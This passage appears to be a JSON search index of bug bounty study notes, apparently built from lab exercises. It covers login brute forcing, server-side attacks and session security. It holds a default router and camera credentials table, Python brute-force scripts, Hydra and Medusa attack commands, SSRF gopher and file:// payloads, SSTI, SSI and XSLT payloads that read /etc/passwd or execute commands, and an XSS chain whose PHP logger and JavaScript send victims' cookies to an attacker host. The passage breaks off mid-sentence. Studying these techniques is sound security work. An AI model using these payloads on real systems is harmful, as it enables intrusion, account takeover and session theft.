Websites","text":"Site Description JS Console Interactive JavaScript console for testing code. JS Minifier Minifies JavaScript for performance optimization. BeatifyTools Obfuscates JavaScript to protect code. JS Obfuscator Tool Tool to obfuscate JavaScript code securely. JSFuck Encodes JavaScript using only six characters. jjencode Encodes JavaScript with JJEncode technique. aaencode Encodes JavaScript with AAEncode method. Prettier Formats and beautifies JavaScript code. js-beautify Beautifies minified or obfuscated JavaScript. UnPacker Deobfuscates and unpacks JavaScript code. rot13.com Applies ROT13 encoding/decoding for text. Cipher Identifier Identifies cipher types in encoded text."},{"location":"bug-bounty-guide/javascript-deobfuscation/#misc","title":"Misc","text":"Command/Action Description <code>ctrl+u</code> Show HTML source code in Firefox <code>ctrl+shift+z</code> Open browser debugger tab '{ }' button Pretty print in debugger tab Unpack Replace eval function with console.log"},{"location":"bug-bounty-guide/login-brute-forcing/","title":"Login Brute Forcing","text":""},{"location":"bug-bounty-guide/login-brute-forcing/#types-of-brute-forcing","title":"Types of Brute Forcing","text":"Attack Type Description Best Used When Simple Brute Force Tries every possible character combination in a set (e.g., lowercase, uppercase, numbers, symbols). When there is no prior information about the password. Dictionary Attack Uses a pre-compiled list of common passwords. When the password is likely weak or follows common patterns. Hybrid Attack Combines brute force and dictionary attacks, adding numbers or symbols to dictionary words. When the target uses slightly modified versions of common passwords. Credential Stuffing Uses leaked credentials from other breaches to access different services where users may have reused passwords. When you have a set of leaked credentials, and the target may reuse passwords. Password Spraying Attempts common passwords across many accounts to avoid detection. When account lockout policies are in place. Rainbow Table Attack Uses precomputed tables of password hashes to reverse them into plaintext passwords. When a large number of password hashes need cracking, and storage for tables is available. Reverse Brute Force Targets a known password against multiple usernames. When there\u2019s a suspicion of password reuse across multiple accounts. Distributed Brute Force Distributes brute force attempts across multiple machines to speed up the process. When the password is highly complex, and a single machine isn't powerful enough."},{"location":"bug-bounty-guide/login-brute-forcing/#default-credentials","title":"Default Credentials","text":"Device/Manufacturer Default Username Default Password Device Type Linksys Router admin admin Wireless Router D-Link Router admin admin Wireless Router Netgear Router admin password Wireless Router TP-Link Router admin admin Wireless Router Cisco Router cisco cisco Network Router Asus Router admin admin Wireless Router Belkin Router admin password Wireless Router Zyxel Router admin 1234 Wireless Router Samsung SmartCam admin 4321 IP Camera Hikvision DVR admin 12345 Digital Video Recorder Axis IP Camera root pass IP Camera Ubiquiti UniFi AP ubnt ubnt Wireless Access Point Canon Printer admin admin Network Printer Honeywell Thermostat admin 1234 Smart Thermostat Panasonic DVR admin 12345 Digital Video Recorder"},{"location":"bug-bounty-guide/login-brute-forcing/#basic-python-brute-force-script","title":"Basic Python Brute Force Script","text":"Python<pre><code>import requests\n\nip = \"127.0.0.1\"  # Change this to your instance IP address\nport = 1234       # Change this to your instance port number\n\n# Try every possible 4-digit PIN (from 0000 to 9999)\nfor pin in range(10000):\n    formatted_pin = f\"{pin:04d}\"  # Convert the number to a 4-digit string (e.g., 7 becomes \"0007\")\n    print(f\"Attempted PIN: {formatted_pin}\")\n\n    # Send the request to the server\n    response = requests.get(f\"http://{ip}:{port}/pin?pin={formatted_pin}\")\n\n    # Check if the server responds with success and the flag is found\n    if response.ok and 'flag' in response.json():  # .ok means status code is 200 (success)\n        print(f\"Correct PIN found: {formatted_pin}\")\n        print(f\"Flag: {response.json()['flag']}\")\n        break\n</code></pre>"},{"location":"bug-bounty-guide/login-brute-forcing/#common-wordlists","title":"Common Wordlists","text":""},{"location":"bug-bounty-guide/login-brute-forcing/#wordlists","title":"Wordlists","text":"Wordlist Description Typical Use <code>SecLists\\Passwords\\Leaked-Databases\\rockyou.txt</code> Millions of leaked passwords from RockYou breach Password brute force attacks <code>SecLists\\Passwords\\Common-Credentials\\darkweb2017_top-10000.txt</code> 10000 leaked passwords from 2017 Password brute force attacks <code>SecLists\\Usernames\\top-usernames-shortlist.txt</code> Concise list of common usernames Quick username brute force <code>SecLists\\Usernames\\xato-net-10-million-usernames.txt</code> Extensive 10 million usernames list Thorough username brute forcing <code>SecLists\\Passwords\\Common-Credentials\\2023-200_most_used_passwords.txt</code> 200 most common passwords as of 2023 Target reused passwords <code>SecLists\\Passwords\\Default-Credentials\\default-passwords.txt</code> Default usernames/passwords for devices/software Try default credentials"},{"location":"bug-bounty-guide/login-brute-forcing/#basic-python-dictionary-solver","title":"Basic Python Dictionary Solver","text":"Python<pre><code>import requests\n\nip = \"127.0.0.1\"  # Change this to your instance IP address\nport = 1234       # Change this to your instance port number\n\n# Download a list of common passwords from the web and split it into lines\npasswords = requests.get(\"https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/500-worst-passwords.txt\").text.splitlines()\n\n# Try each password from the list\nfor password in passwords:\n    print(f\"Attempted password: {password}\")\n\n    # Send a POST request to the server with the password\n    response = requests.post(f\"http://{ip}:{port}/dictionary\", data={'password': password})\n\n    # Check if the server responds with success and contains the 'flag'\n    if response.ok and 'flag' in response.json():\n        print(f\"Correct password found: {password}\")\n        print(f\"Flag: {response.json()['flag']}\")\n        break\n</code></pre>"},{"location":"bug-bounty-guide/login-brute-forcing/#hybrid-attacks","title":"Hybrid Attacks","text":""},{"location":"bug-bounty-guide/login-brute-forcing/#brute-forcing-tools","title":"Brute-Forcing Tools","text":""},{"location":"bug-bounty-guide/login-brute-forcing/#hydra-parameters","title":"Hydra Parameters","text":"Parameter Explanation Usage Example -l LOGIN or -L FILE Login options: Single username or username list <code>hydra -l admin ...</code> or <code>hydra -L usernames.txt ...</code> -p PASS or -P FILE Password options: Single password or password list <code>hydra -p password123 ...</code> or <code>hydra -P passwords.txt ...</code> -t TASKS Number of parallel tasks (threads) <code>hydra -t 4 ...</code> -f Stop after first successful login <code>hydra -f ...</code> -s PORT Specify non-default port <code>hydra -s 2222 ...</code> -v or -V Verbose output for progress <code>hydra -v ...</code> or <code>hydra -V ...</code> service://server Target service and hostname <code>hydra ssh://192.168.1.100 ...</code> /OPT Service-specific options <code>hydra http-get://example.com/login.php -m \"POST:user=^USER^&amp;pass=^PASS^\"</code>"},{"location":"bug-bounty-guide/login-brute-forcing/#hydra-service","title":"Hydra Service","text":""},{"location":"bug-bounty-guide/login-brute-forcing/#hydra-services","title":"Hydra Services","text":"Service Description Example Command ftp Brute-forces FTP login credentials for file transfers <code>hydra -l admin -P passwords.txt ftp://192.168.1.100</code> ssh Brute-forces SSH credentials for remote login <code>hydra -l root -P passwords.txt ssh://192.168.1.100</code> http-post Brute-forces HTTP login forms via POST <code>F=</code> failure condition <code>S=</code> Success condition (302 or welcome message) <code>hydra -l admin -P passwords.txt http-post-form \"/login.php:user=^USER^&amp;pass=^PASS^:F=incorrect\"</code> http-get Brute-forces HTTP login forms via GET <code>hydra -L usernames.txt -P passwords.txt www.example.com http-get</code> smtp Brute-forces SMTP login for email sending <code>hydra -l admin -P passwords.txt smtp://mail.server.com</code> pop3 Brute-forces POP3 credentials for email retrieval <code>hydra -l user@example.com -P passwords.txt pop3://mail.server.com</code> imap Brute-forces IMAP credentials for email access <code>hydra -l user@example.com -P passwords.txt imap://mail.server.com</code> mysql Brute-forces MySQL database login credentials <code>hydra -l root -P passwords.txt mysql://192.168.1.100</code> mssql Brute-forces Microsoft SQL Server credentials <code>hydra -l sa -P passwords.txt mssql://192.168.1.100</code> vnc Brute-forces VNC for remote desktop access <code>hydra -P passwords.txt vnc://192.168.1.100</code> rdp Brute-forces RDP for remote login <code>hydra -l admin -P passwords.txt rdp://192.168.1.100</code>"},{"location":"bug-bounty-guide/login-brute-forcing/#examples","title":"Examples","text":"Bash<pre><code>hydra -l root -p toor -M targets.txt ssh # Use the username \"root\"/Use the password \"toor\"/Target all IP addresses listed in the targets.txt file/Employ the ssh module for the attack\nhydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp # Target the FTP service on ftp.example.com via port 2121\nhydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp # Generate and test passwords ranging from 6 to 8 characters, using the specified character set\nhydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81 # Target service is an HTTP server and the attack should be performed using HTTP GET requests to the root path ('/')\n</code></pre>"},{"location":"bug-bounty-guide/login-brute-forcing/#medusa","title":"Medusa","text":""},{"location":"bug-bounty-guide/login-brute-forcing/#medusa-parameters","title":"Medusa Parameters","text":"Parameter Explanation Usage Example -h HOST or -H FILE Target: Single hostname/IP or list file <code>medusa -h 192.168.1.10 ... or medusa -H targets.txt ...</code> -u USERNAME or -U FILE Username: Single or list file <code>medusa -u admin ... or medusa -U usernames.txt ...</code> -p PASSWORD or -P FILE Password: Single or list file <code>medusa -p password123 ... or medusa -P passwords.txt ...</code> -M MODULE Module: Specific service (e.g., ssh, ftp, http) <code>medusa -M ssh ...</code> -m \"MODULE_OPTION\" Module options: Additional parameters in quotes <code>medusa -M http -m \"POST /login.php HTTP/1.1\\r\\nContent-Length: 30\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\n\\r\\nusername=^USER^&amp;password=^PASS^\" ...</code> -t TASKS Tasks: Number of parallel login attempts <code>medusa -t 4 ...</code> -f or -F Fast mode: Stop after first success (-f current host, -F any host) <code>medusa -f ... or medusa -F ...</code> -n PORT Port: Non-default port <code>medusa -n 2222 ...</code> -v LEVEL Verbose: Detailed progress (LEVEL up to 6) <code>medusa -v 4 ...</code>"},{"location":"bug-bounty-guide/login-brute-forcing/#medusa-module","title":"Medusa Module","text":""},{"location":"bug-bounty-guide/login-brute-forcing/#medusa-modules","title":"Medusa Modules","text":"Module Service/Protocol Description Usage Example FTP File Transfer Protocol Brute-forcing FTP login credentials for file transfers over a network <code>medusa -M ftp -h 192.168.1.100 -u admin -P passwords.txt</code> HTTP POST Hypertext Transfer Protocol Brute-forcing login forms on web applications over HTTP (POST) <code>medusa -M http -h www.example.com -U users.txt -P passwords.txt -m DIR:/login.php -m FORM:\"username=^USER^&amp;password=^PASS^:F=Invalid\"</code> HTTP GET Hypertext Transfer Protocol Brute-forcing login forms on web applications over HTTP (GET) <code>medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET</code> IMAP Internet Message Access Protocol Brute-forcing IMAP logins for email access <code>medusa -M imap -h mail.example.com -U users.txt -P passwords.txt</code> MySQL MySQL Database Brute-forcing MySQL database credentials for web apps and databases <code>medusa -M mysql -h 192.168.1.100 -u root -P passwords.txt</code> POP3 Post Office Protocol 3 Brute-forcing POP3 logins for email retrieval from mail servers <code>medusa -M pop3 -h mail.example.com -U users.txt -P passwords.txt</code> RDP Remote Desktop Protocol Brute-forcing RDP logins for remote desktop access to Windows systems <code>medusa -M rdp -h 192.168.1.100 -u admin -P passwords.txt</code> SSHv2 Secure Shell (SSH) Brute-forcing SSH logins for secure remote access <code>medusa -M ssh -h 192.168.1.100 -u root -P passwords.txt</code> Subversion (SVN) Version Control System Brute-forcing Subversion repositories for version control <code>medusa -M svn -h 192.168.1.100 -u admin -P passwords.txt</code> Telnet Telnet Protocol Brute-forcing Telnet services for remote command execution on older systems <code>medusa -M telnet -h 192.168.1.100 -u admin -P passwords.txt</code> VNC Virtual Network Computing Brute-forcing VNC login credentials for remote desktop access <code>medusa -M vnc -h 192.168.1.100 -P passwords.txt</code> Web Form Brute-forcing Web Login Forms Brute-forcing login forms on websites using HTTP POST requests <code>medusa -M web-form -h www.example.com -U users.txt -P passwords.txt -m FORM:\"username=^USER^&amp;password=^PASS^:F=Invalid\"</code> <p>Tip: <code>medusa -h 10.0.0.5 -U usernames.txt -e ns -M service_name</code> checks for empty passwords (-e n) and passwords matching the username (-e s).</p>"},{"location":"bug-bounty-guide/login-brute-forcing/#custom-wordlists","title":"Custom Wordlists","text":""},{"location":"bug-bounty-guide/login-brute-forcing/#username-anarchy","title":"Username Anarchy","text":"<p>Generates potential usernames based on a target's name.</p> Command Description <code>username-anarchy Jane Smith &gt; jane_smith_usernames.txt</code> Generate possible usernames for \"Jane Smith\" <code>username-anarchy -i names.txt</code> Use a file (names.txt) with names for input. Can handle space, CSV, or TAB delimited names. <code>username-anarchy -a --country us</code> Automatically generate usernames using common names from the US dataset. <code>username-anarchy -l</code> List available username format plugins. <code>username-anarchy -f format1,format2</code> Use specific format plugins for username generation (comma-separated). <code>username-anarchy -@ example.com</code> Append @example.com as a suffix to each username. <code>username-anarchy --case-insensitive</code> Generate usernames in case-insensitive (lowercase) format."},{"location":"bug-bounty-guide/login-brute-forcing/#cupp-common-user-passwords-profiler","title":"CUPP (Common User Passwords Profiler)","text":"<p>Creates personalized password wordlists based on gathered intelligence.</p> Command Description <code>cupp -i</code> Generate wordlist based on personal information (interactive mode). <code>cupp -w profiles.txt</code> Generate a wordlist from a predefined profile file. <code>cupp -l</code> Download popular password lists like rockyou.txt."},{"location":"bug-bounty-guide/login-brute-forcing/#password-policy-filtering","title":"Password Policy Filtering","text":"<p>Password policies often dictate specific requirements for password strength, such as minimum length, inclusion of certain character types, or exclusion of common patterns. grep combined with regular expressions can filter wordlists to identify passwords that adhere to a given policy.</p>"},{"location":"bug-bounty-guide/login-brute-forcing/#policy-requirements-and-grep-regex-patterns","title":"Policy Requirements and Grep Regex Patterns","text":"Policy Requirement Grep Regex Pattern Explanation Minimum Length (e.g., 8 characters) <code>grep -E '^.{8,}$' wordlist.txt</code> <code>^</code> matches the start of the line, <code>.</code> matches any character, <code>{8,}</code> matches 8 or more occurrences, <code>$</code> matches the end of the line. At Least One Uppercase Letter <code>grep -E '[A-Z]' wordlist.txt</code> <code>[A-Z]</code> matches any uppercase letter. At Least One Lowercase Letter <code>grep -E '[a-z]' wordlist.txt</code> <code>[a-z]</code> matches any lowercase letter. At Least One Digit <code>grep -E '[0-9]' wordlist.txt</code> <code>[0-9]</code> matches any digit. At Least One Special Character <code>grep -E '[!@#$%^&amp;*()_+-=[]{};':\"\\,.&lt;&gt;/?]' wordlist.txt</code> <code>[!@#$%^&amp;*()_+-=[]{};':\"\\,.&lt;&gt;/?]</code> matches any special character (symbol). No Consecutive Repeated Characters <code>grep -E '(.)\\1' wordlist.txt</code> <code>(.)</code> captures any character, <code>\\1</code> matches the previously captured character. This pattern will match any line with consecutive repeated characters. Use <code>grep -v</code> to invert the match. Exclude Common Patterns (e.g., \"password\") <code>grep -v -i 'password' wordlist.txt</code> <code>-v</code> inverts the match, <code>-i</code> makes the search case-insensitive. This pattern will exclude any line containing \"password\" (or \"Password\", \"PASSWORD\", etc.). Exclude Dictionary Words <code>grep -v -f dictionary.txt wordlist.txt</code> <code>-f</code> reads patterns from a file. <code>dictionary.txt</code> should contain a list of common dictionary words, one per line. Combination of Requirements <code>grep -E '^.{8,}$' wordlist.txt \\| grep -E '[A-Z]'</code> Filters a wordlist to meet multiple password policy requirements. Ensures each word has a minimum length of 8 characters and contains at least one uppercase letter."},{"location":"bug-bounty-guide/server-side-attacks/","title":"Server-Side Attacks","text":""},{"location":"bug-bounty-guide/server-side-attacks/#server-side-request-forgery-ssrf","title":"Server Side Request Forgery (SSRF)","text":"<p>OWASP SSRF Page</p>"},{"location":"bug-bounty-guide/server-side-attacks/#identification","title":"Identification","text":"<p>Based on web app at http://10.129.201.127:34978 that has a drop down to check date availbility through a post parameter (<code>dateserver=http://dateserver.htb/availability.php&amp;date=2024-01-01</code>):</p> <ul> <li>Try pointing the post request to itself to see if the response reflects <code>dateserver=http://127.0.0.1/index.php&amp;date=2024-01-01</code></li> <li>Use burp to check post parameter for dynamically loaded content.</li> <li>Try changing the request to see if error infromation.</li> <li>Start a netcat listener and send a request in the post parameter to it i.e: <code>dateserver=http://10.10.15.145:8000/ssrf/&amp;date=2024-01-01</code>.</li> </ul>"},{"location":"bug-bounty-guide/server-side-attacks/#exploitation","title":"Exploitation","text":""},{"location":"bug-bounty-guide/server-side-attacks/#lfi","title":"LFI","text":"<p>Change POST parameter to <code>dateserver=file:///etc/passwd&amp;date=2024-01-01</code>.</p>"},{"location":"bug-bounty-guide/server-side-attacks/#port-scan","title":"Port Scan","text":"<p>Internal portscan by accessing ports on localhost:</p> Bash<pre><code>seq 1 10000 &gt; ports.txt\nffuf -w ./ports.txt -u http://10.129.201.127/index.php -X POST -H \"Content-Type: application/x-www-form-urlencoded\" -d \"dateserver=http://127.0.0.1:FUZZ/&amp;date=2024-01-01\" -fr \"Failed to connect to\"\n</code></pre>"},{"location":"bug-bounty-guide/server-side-attacks/#fuzzing-endpoints","title":"Fuzzing Endpoints","text":"<p>Accessing restricted endpoints:</p> Bash<pre><code>ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://10.129.201.127/index.php -X POST -H \"Content-Type: application/x-www-form-urlencoded\" -d \"dateserver=http://dateserver.htb/FUZZ.php&amp;date=2024-01-01\" -fr \"Server at dateserver.htb Port 80\"\n</code></pre>"},{"location":"bug-bounty-guide/server-side-attacks/#using-gopher","title":"Using Gopher","text":"<p>Consider we find an endpoint admin.php through fuzzing which returns a POST form:</p> <p></p> <p>To send a POST request to /admin.php containing the password in the adminpw POST parameter we can use gopher: <code>dateserver=gopher%3a//dateserver.htb%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&amp;date=2024-01-01</code></p> <p>Gopher crafted a post request within the <code>dataserver</code> post parameter.</p> <p>Gopher can craft URLs that access other internal services through post parameters: - MySQL - PostgreSQL - FastCGI - Redis - SMTP - Zabbix - pymemcache - rbmemcache - phpmemcache - dmpmemcache</p> <p>We can use Gopherus to craft these payloads for us.</p>"},{"location":"bug-bounty-guide/server-side-attacks/#protocols","title":"Protocols","text":"<ul> <li><code>http://127.0.0.1/</code> or <code>https://</code> can be used to access internal or external endpoints</li> <li><code>file:///etc/passwd</code> can be used for local file inclusion</li> <li><code>gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin</code> can be used to send arbitrary payloads with internal services</li> </ul>"},{"location":"bug-bounty-guide/server-side-attacks/#blind-ssrf","title":"Blind SSRF","text":"<ul> <li>Can still confirm by sending request to a netcat listener.</li> <li>Local port scan may work by comparing error messages, but error message may be the same for closed ports/other services that are open.</li> <li>LFI attempts may show different error messages for files that exist versus files that don't.</li> </ul>"},{"location":"bug-bounty-guide/server-side-attacks/#server-side-template-injection-ssti","title":"Server Side Template Injection (SSTI)","text":""},{"location":"bug-bounty-guide/server-side-attacks/#tepmlate-engines","title":"Tepmlate engines","text":"<ul> <li>Jinga</li> <li>Twig</li> </ul>"},{"location":"bug-bounty-guide/server-side-attacks/#exploitation_1","title":"Exploitation","text":"<p>Templating Engines are used to dynamically generate content.</p>"},{"location":"bug-bounty-guide/server-side-attacks/#test-string","title":"Test String","text":"<ul> <li><code>${{&lt;%[%'\"}}%\\.</code> Should result in an error message if the template is vulnerable.</li> <li>Follow the below tree looking to find when payload is executed successfully i.e. 7*7 returns 49.</li> <li>{{7*'7'}} will be 7777777 in Jinja, while in Twig, the result will be 49.</li> </ul>"},{"location":"bug-bounty-guide/server-side-attacks/#jingapython","title":"Jinga(python)","text":"Payload Description <code>{{ config.items() }}</code> Dump web app config file <code>{{ self.__init__.__globals__.__builtins__ }}</code> Dump built in functions <code>{{ self.__init__.__globals__.__builtins__.open(\"/etc/passwd\").read() }}</code> Use the python <code>open()</code> function to perform LFI <code>{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}</code> Import the python <code>os</code> library to perform RCE"},{"location":"bug-bounty-guide/server-side-attacks/#twigphp","title":"Twig(PHP)","text":"Payload Description <code>{{ _self }}</code> Dump a small amount of info about the current template <code>{{ \"/etc/passwd\"\\|file_excerpt(1,-1) }}</code> Use the <code>file_excerpt()</code> function from the Symfony framework to perform LFI <code>{{ ['id'] \\| filter('system') }}</code> RCE using twigs <code>filter()</code> function to pass arguments to <code>system</code> the built-in PHP function <p>Payload all the things cheat sheet for other templates</p>"},{"location":"bug-bounty-guide/server-side-attacks/#sstimap","title":"SSTImap","text":"<ul> <li>For identifying and exploiting SSTI attacks</li> <li>https://github.com/vladko312/SSTImap</li> </ul> Bash<pre><code>git clone https://github.com/vladko312/SSTImap\ncd SSTImap\npip3 install -r requirements.txt\npython3 sstimap.py\npython3 sstimap.py -u http://172.17.0.2/index.php?name=test # Provide target URL to identify SSTI\npython3 sstimap.py -u http://172.17.0.2/index.php?name=test -D '/etc/passwd' './passwd' # Download remote file to local machine\npython3 sstimap.py -u http://172.17.0.2/index.php?name=test -S id # Execute system commands\npython3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell # Obtain interactive shell\n</code></pre>"},{"location":"bug-bounty-guide/server-side-attacks/#server-side-includes-ssi-injection-directives","title":"Server Side Includes (SSI) Injection - Directives","text":"<ul> <li>Typical SSI file extensions include .shtml, .shtm, and .stm (can be configured for arbitrary file extensions).</li> <li>SSI utilizes directives to add dynamically generated content to a static HTML page.</li> <li>Occurs when an attacker can inject SSI directives into a file (usually in the web root directory) that is subsequently served by the web server.</li> </ul> Directive Description <code>&lt;!--#name param1=\"value1\" param2=\"value\" --&gt;</code> Directive format <code>&lt;!--#printenv --&gt;</code> Print the environment variables <code>&lt;!--#config errmsg=\"Error!\" --&gt;</code> Change config (the error message in this example) <code>&lt;!--#echo var=\"DOCUMENT_NAME\" var=\"DOCUMENT_URI\" var=\"LAST_MODIFIED\" var=\"DATE_LOCAL\" --&gt;</code> Print specific variable <code>&lt;!--#exec cmd=\"whoami\" --&gt;</code> Execute command <code>&lt;!--#include virtual=\"index.html\" --&gt;</code> Include web file (only allows files in the web root directory)"},{"location":"bug-bounty-guide/server-side-attacks/#extensible-stylesheet-language-transformation-xslt-injection","title":"eXtensible Stylesheet Language Transformation (XSLT) Injection","text":"<ul> <li>Documentation</li> <li>XSLT can be used to define a data format which is subsequently enriched with data from the XML document.</li> <li>Similar structure to XML.</li> <li>It contains XSL elements within nodes prefixed with the xsl-prefix</li> <li>Example:</li> </ul> XSLT<pre><code>&lt;?xml version=\"1.0\"?&gt;\n&lt;xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"&gt;\n    &lt;xsl:template match=\"/fruits\"&gt;\n        Here are all fruits of medium size ordered by their color:\n        &lt;xsl:for-each select=\"fruit\"&gt;\n            &lt;xsl:sort select=\"color\" order=\"descending\" /&gt;\n            &lt;xsl:if test=\"size = 'Medium'\"&gt;\n                &lt;xsl:value-of select=\"name\"/&gt; (&lt;xsl:value-of select=\"color\"/&gt;)\n            &lt;/xsl:if&gt;\n        &lt;/xsl:for-each&gt;\n    &lt;/xsl:template&gt;\n&lt;/xsl:stylesheet&gt;\n</code></pre>"},{"location":"bug-bounty-guide/server-side-attacks/#elements","title":"Elements","text":"Element Description <code>&lt;xsl:template&gt;</code> Indicates an XSL template. Can contain a match attribute that contains a path in the XML-document that the template applies to <code>&lt;xsl:value-of&gt;</code> Extracts the value of the XML node specified in the select attribute <code>&lt;xsl:for-each&gt;</code> Enables looping over all XML nodes specified in the select attribute <code>&lt;xsl:sort&gt;</code> Specifies the node to sort elements in a for loop by in the select argument. A sort order may be specified in the order argument <code>&lt;xsl:if&gt;</code> Used to test for conditions on a node. The condition is specified in the test argument"},{"location":"bug-bounty-guide/server-side-attacks/#injection-payloads","title":"Injection Payloads","text":"<ul> <li><code>&lt;</code> Test payload to see if an error message is returned.</li> </ul>"},{"location":"bug-bounty-guide/server-side-attacks/#information-disclosure","title":"Information Disclosure","text":"Payload Description <code>&lt;xsl:value-of select=\"system-property('xsl:version')\" /&gt;</code> Version <code>&lt;xsl:value-of select=\"system-property('xsl:vendor')\" /&gt;</code> Vendor <code>&lt;xsl:value-of select=\"system-property('xsl:vendor-url')\" /&gt;</code> Vendor URL <code>&lt;xsl:value-of select=\"system-property('xsl:product-name')\" /&gt;</code> Product name <code>&lt;xsl:value-of select=\"system-property('xsl:product-version')\" /&gt;</code> Product Version <p>Tip: Pass all the above payloads in one go separated by <code>&lt;br/&gt;</code> for formatting.</p>"},{"location":"bug-bounty-guide/server-side-attacks/#lfi_1","title":"LFI","text":"Payload Description <code>&lt;xsl:value-of select=\"unparsed-text('/etc/passwd', 'utf-8')\" /&gt;</code> LFI for XSLT v1.0 <code>&lt;xsl:value-of select=\"php:function('file_get_contents','/etc/passwd')\" /&gt;</code> LFI for XSLT v2.0"},{"location":"bug-bounty-guide/server-side-attacks/#rce","title":"RCE","text":"Payload Description <code>&lt;xsl:value-of select=\"php:function('system','id')\" /&gt;</code> RCE if the XSLT processor supports PHP functions"},{"location":"bug-bounty-guide/session-security/","title":"Session Security","text":""},{"location":"bug-bounty-guide/session-security/#session-identifier-storage-locations","title":"Session Identifier storage locations","text":"<ul> <li>URL </li> <li>HTML</li> <li>sessionStorage</li> <li>localStorage</li> </ul> <p>TIP Adding vhosts to hosts file</p> Bash<pre><code>IP=ENTER SPAWNED TARGET IP HERE\nprintf \"%s\\t%s\\n\\n\" \"$IP\" \"xss.htb.net csrf.htb.net oredirect.htb.net minilab.htb.net\" | sudo tee -a /etc/hosts\n</code></pre>"},{"location":"bug-bounty-guide/session-security/#session-hijacking","title":"Session Hijacking","text":"<p>An attacker can obtain a victim's session identifier using several methods, with the most common being:</p> <ul> <li>Passive Traffic Sniffing</li> <li>Cross-Site Scripting (XSS)</li> <li>Browser history or log-diving</li> <li>Read access to a database containing session information</li> </ul> <p>Replace your identifier with the victims to access their session.</p>"},{"location":"bug-bounty-guide/session-security/#session-fixation","title":"Session Fixation","text":"<p>Trick the victim into logging in with a previously obtained valid session identifier. Works when session identifier:  - is the same pre and post login. - is accepted URL query string or post data.</p>"},{"location":"bug-bounty-guide/session-security/#example","title":"Example","text":"<p>If we visit <code>http://insecure.exampleapp.com/login?PHPSESSID=AttackerSpecifiedCookieValue</code> and find that <code>AttackerSpecifiedCookieValue</code> has been propagated to the cookie value there is a vulnerability.</p>"},{"location":"bug-bounty-guide/session-security/#obtaining-session-identifiers-without-user-interaction","title":"Obtaining Session Identifiers without User Interaction","text":""},{"location":"bug-bounty-guide/session-security/#obtaining-session-identifiers-via-traffic-sniffing","title":"Obtaining Session Identifiers via Traffic Sniffing","text":""},{"location":"bug-bounty-guide/session-security/#wireshark","title":"Wireshark","text":"<ul> <li>Navigate to Edit -&gt; Find Packet</li> <li>Left-click on Packet list and then click Packet bytes</li> <li>Select String on the third drop-down menu and specify auth-session on the field next to it</li> <li>Click Find</li> <li>Click Copy then Value</li> <li>Replace cookie value with the stolen one and refresh page</li> </ul>"},{"location":"bug-bounty-guide/session-security/#obtaining-session-identifiers-post-exploitation-web-server-access","title":"Obtaining Session Identifiers Post-Exploitation (Web Server Access)","text":""},{"location":"bug-bounty-guide/session-security/#php","title":"PHP","text":"<p>Find session storage location: Bash<pre><code>locate php.ini\ncat /etc/php/7.4/cli/php.ini | grep 'session.save_path'\ncat /etc/php/7.4/apache2/php.ini | grep 'session.save_path'\n</code></pre> Then look for authenticated users session data: Bash<pre><code>ls /var/lib/php/sessions\ncat //var/lib/php/sessions/sess_s6kitq8d3071rmlvbfitpim9mm\n</code></pre> For a hacker to hijack the user session related to the session identifier above, a new cookie must be created in the web browser with the following values: - cookie name: PHPSESSID - cookie value: s6kitq8d3071rmlvbfitpim9mm</p>"},{"location":"bug-bounty-guide/session-security/#obtaining-session-identifiers-post-exploitation-database-access","title":"Obtaining Session Identifiers Post-Exploitation (Database Access)","text":"SQL<pre><code>show databases;\nuse project;\nshow tables;\nselect * from users; -- look in tables found previously\nselect * from all_sessions;\nselect * from all_sessions where id=3; -- look in specific record in a table\n</code></pre>"},{"location":"bug-bounty-guide/session-security/#cross-site-scripting-xss","title":"Cross-Site Scripting (XSS)","text":"<p>For a Cross-Site Scripting (XSS) attack to result in session cookie leakage, the following requirements must be fulfilled: - Session cookies should be carried in all HTTP requests - Session cookies should be accessible by JavaScript code (the HTTPOnly attribute should be missing (check in cookies web dev tools))</p> <p>Test fields with the following payloads JavaScript<pre><code>\"&gt;&lt;img src=x onerror=prompt(document.domain)&gt;\n\"&gt;&lt;img src=x onerror=confirm(1)&gt;\n\"&gt;&lt;img src=x onerror=alert(1)&gt;\n</code></pre> dependning on what (if anything) is returned will tell you which field is vulnerable</p>"},{"location":"bug-bounty-guide/session-security/#obtaining-session-cookies-through-xss","title":"Obtaining session cookies through XSS","text":"<ul> <li>Create a cookie-logging script PHP<pre><code>&lt;?php\n$logFile = \"cookieLog.txt\";\n$cookie = $_REQUEST[\"c\"];\n\n$handle = fopen($logFile, \"a\");\nfwrite($handle, $cookie . \"\\n\\n\");\nfclose($handle);\n\nheader(\"Location: http://www.google.com/\");\nexit;\n?&gt;\n</code></pre></li> <li>start the listener Bash<pre><code>php -S &lt;VPN/TUN Adapter IP&gt;:8000\n</code></pre></li> <li>update the vulnerable field with a payload JavaScript<pre><code>&lt;style&gt;@keyframes x{}&lt;/style&gt;&lt;video style=\"animation-name:x\" onanimationend=\"window.location = 'http://&lt;VPN/TUN Adapter IP&gt;:8000/log.php?c=' + document.cookie;\"&gt;&lt;/video&gt;\n// or\n&lt;h1 onmouseover='document.write(`&lt;img src=\"https://CUSTOMLINK?cookie=${btoa(document.cookie)}\"&gt;`)'&gt;test&lt;/h1&gt;\n</code></pre></li> <li>visit the updated profile page to trigger the payload</li> </ul> <p>Note: If you're doing testing in the real world, try using something like XSSHunter (now deprecated), Burp Collaborator or Project Interactsh. A default PHP Server or Netcat may not send data in the correct form when the target web application utilizes 